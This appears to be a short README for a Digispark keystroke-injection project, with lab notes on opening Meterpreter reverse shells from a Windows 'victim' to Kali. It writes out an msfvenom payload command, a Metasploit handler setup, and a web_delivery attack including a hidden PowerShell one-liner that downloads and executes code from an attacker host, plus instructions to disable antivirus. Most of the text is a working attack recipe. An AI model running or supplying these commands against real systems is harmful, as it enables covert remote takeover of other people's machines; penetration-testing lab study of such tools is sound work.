# B.K.B (good name)

[DigiKeyboard reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h)
|
[DigiMouse reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkMouse/DigiMouse.h) 
(only one can be used at a time)

# Opening a revershell from windows to kali

Confingure both machines to be in the same internal network and able to ping each other.

Generate the payload using msfvenon.  
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Disbale antirvirus and transfer the payload to the victim machine.

Set up a reverse shell handler in kali.  
```
> use exploit/multi/handler  
> set payload windows/meterpreter/reverse_tcp
> set lhost=<IP>
> set lport=<PORT>
> run
```

Run the exe in victim machine and wait for connection.


# Exploiting via web delivery

In msfconsole,
```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
```

set lhost and lport

in windows cmd with antivirus disabled,
```
powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://<ip>:<port>/<uri>');
```
